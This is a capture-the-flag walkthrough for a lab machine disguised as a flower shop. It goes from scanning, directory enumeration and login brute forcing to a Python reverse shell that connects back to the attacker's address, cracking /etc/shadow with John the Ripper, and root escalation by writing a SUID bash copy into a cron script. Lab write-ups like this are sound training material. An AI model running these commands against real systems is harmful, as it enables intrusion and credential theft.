# Flowers by Irene - CTF Walkthrough

**Theme:** A secret agent website is masquerading as an innocent flower shop. Your mission is to infiltrate the system, escalate privileges, and retrieve the hidden flag from the agency's root directory.

---

## 1. Network Reconnaissance

Start with a fast Nmap scan to identify open ports and active hosts on your local subnet.

```bash
nmap -F 192.168.0.0/24
```

- **Discovered:** Host at `192.168.1.111` with HTTP service on **port 8080**

---

## 2. Web Exploration

Navigate to the web server:

```
http://192.168.1.111:8080
```

It looks like a generic flower shop. But... something seems suspicious.

---

## 3. Source Code Inspection

Right-click → *View Page Source*.

You’ll spot a hidden HTML button and a **base64** encoded message.

```html
<button class="toggle-button" onclick="toggleSection()" style="display:none">🔍 More Information</button>

    <script>
        var encodedContent = "T1BFUkFUSU9OIEVWRVJCTE9PTSAtIExldmVsIDcgQ2xlYXJhbmNlIFJlcXVpcmVkCldlbGNvbWUsIGFnZW50LiBZb3UgaGF2ZSBzdWNjZXNzZnVsbHkgYWNjZXNzZWQgdGhlIGNvdmVydCBpbnRlbGxpZ2VuY2UgYnJpZWZpbmcgcG9ydGFsLiBQbGVhc2UgcHJvY2VlZCB0byB0aGUgZGVzaWduYXRlZCByZW5kZXp2b3VzIHBvaW50IGF0ICJUaGUgR3JlZW5ob3VzZSIgd2l0aCBlbmNyeXB0ZWQgb3JkZXJzLgpGb3IgaW1tZWRpYXRlIGFjY2VzcyB0byBjYXNlIGZpbGVzLCBpbnB1dCB5b3VyIGFnZW50IElEIGFuZCBjbGVhcmFuY2UgY29kZSB2aWEgdGhlIHNlY3VyZSBsb2dpbiBwb3J0YWwuIFVuYXV0aG9yaXplZCBhdHRlbXB0cyB3aWxsIGJlIGxvZ2dlZC4=";

        function toggleSection() {
            var section = document.getElementById("hidden-section");
            var decodedContent = atob(encodedContent);
            document.getElementById("decoded-content").innerText = decodedContent;
            
            if (section.style.display === "none" || section.style.display === "") {
                section.style.display = "block";
            } else {
                section.style.display = "none";
            }
        }
    </script>
```

Decode the message using **CyberChef**:

**Output:**
```
OPERATION EVERBLOOM - Level 7 Clearance Required
Welcome, agent. You have successfully accessed the covert intelligence briefing portal. Please proceed to the designated rendezvous point at "The Greenhouse" with encrypted orders.
For immediate access to case files, input your agent ID and clearance code via the secure login portal. Unauthorized attempts will be logged.
```

Alternatively, remove `style="display:none"` to display the button.

---

## 4. Directory Enumeration

The message indicates there is a login portal, let’s see if we can discover it by enumerating the hidden directories:

```bash
gobuster dir -u http://192.168.1.111:8080 -w /usr/share/wordlists/dirb/big.txt
```

**Discovered:** `/restricted`

---

## 5. User Reconnaissance

Visit the restricted area and you are introduced with an agent login portal:

```
http://192.168.1.111:8080/restricted
```

Check the page source again. A comment reveals:

```html
<!-- 
    WARNING: DO NOT REMOVE THIS COMMENT. 

    Last time someone deleted this, We lost power for three hours. 
    We’re still not sure why. IT just mumbled something about "arbitrary code" 
    and refused to make eye contact. 

    - P.S. Don’t forget to inform Agent Cain that his agent ID has been changed to 
    "agent.cain-222" at HR's request. Apparently "Cain_the_Destroyer" was "inappropriate."
    -->
```

---

## 6. Brute Force the Login

Fire up **Burp Suite** → Proxy → Intercept the login POST request → Send to **Intruder**.

Use the username `agent.cain-222` and the following password list:

```
/usr/share/wordlists/seclists/Passwords/Common-Credentials/2024-197_most_used_passwords.txt
```

After the brute-force attack:

> **Password found: `1234qwer`**

---

## 7. Agent Dashboard Access

Login with the credentials and you’ll land on **Agent Cain’s Dashboard**.

A button labeled **Access Command Interface** appears. Click it.

---

## 8. Restricted Shell Terminal

Inside the web terminal, your commands are limited.

Try some basics like `ls`, `cd`, and notice restricted access to system files and commands.

Time to break out.

---

## 9. Reverse Shell Escape

Start a listener on your **attacker machine (Kali)**:

```bash
rlwrap nc -lvnp 1234
```

Then, in the web terminal, execute a Python reverse shell:

```python
python3 -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.0.110",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")'
```

You're in.

---

## 10. Shadow File Discovery

Check permissions of shadow:

```bash
ls -l /etc/shadow
```

You're lucky! It's readable.

```bash
cat /etc/shadow
```

Copy the shadow file content and save it to your **attacker machine (Kali)**.

---

## 11. Cracking Passwords

Use **John the Ripper** to crack the password hashes:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt shadow
```

**Result:**
> `agent.cain:1234qwer`
> `irene:batman1`

---

## 12. Privilege Escalation via Cronjob

Switch to user **irene**:

```bash
su irene
# password: batman1
```

Check cron jobs:

```bash
journalctl -u cron
```

**Found:** A scheduled cronjob runs `/opt/copy2root` every minute **as root**!

Let’s weaponize it:

```bash
echo "cp /bin/bash /tmp/rootbash" > /opt/copy2root
echo "chmod +s /tmp/rootbash" >> /opt/copy2root
```

Wait 1 minute…

---

## 13. Root Shell Access

Run your new SUID bash shell:

```bash
/tmp/rootbash -p
```

You're now root!

---

## 14. Capture the Flag

Head to the root directory:

```bash
cd /root
ls -la
```

Find a file called `.flag`. It contains 50,000+ words so were going to have to filter for it.

Use `grep` to find the flag:

```bash
cat .flag | grep FLAG
```

---

## Final Flag

> `FLAG{This_flag_will_self-destruct}`

---

### Congratulations.

You’ve successfully uncovered the flag. Mission accomplished.

---

## Bonus

Visit the homepage and you are greeted with a alternative image then before, download the image and save to your **attacker machine (Kali)**. The image is hiding a secret document using steganography. Let's extract the document using **steghide** without a passphrase.

```bash
steghide extract -sf fbi.jpeg
```

An embedded file called `OPERATION EVERBLOOM.txt".` is extracted. Let's check it out!

```bash
less 'OPERATION EVERBLOOM.txt'
```

---
